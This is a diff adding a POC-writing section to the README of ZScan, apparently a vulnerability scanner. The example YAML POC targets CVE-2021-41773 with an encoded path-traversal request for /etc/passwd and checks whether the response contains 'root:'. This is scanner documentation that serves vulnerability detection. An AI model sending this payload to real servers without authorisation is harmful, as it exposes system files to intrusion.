@@ -151,3 +151,20 @@ Thanks to all the amazing community contributors for sending PRs and keeping thi
 
 ## License
 ZScan is distributed under MIT License.
+
+## 🔍 Writing POCs
+
+ZScan supports custom POC development in YAML format. For detailed information about POC writing, please refer to our [POC Writing Guide](https://github.com/zcyberseclab/zscan/wiki/ZScan-POC-Writing-Guide).
+
+Example POC:
+```yaml
+type: Path Traversal
+cve-id: CVE-2021-41773
+severity: critical
+rules:
+  - method: GET
+    path: /icons/.%2e/%2e%2e/etc/passwd
+    expression: "response.status==200 && response.body.bcontains(b'root:')"
+```
+
+For more examples and detailed syntax, check our [POC Writing Guide](https://github.com/zcyberseclab/zscan/wiki/ZScan-POC-Writing-Guide).
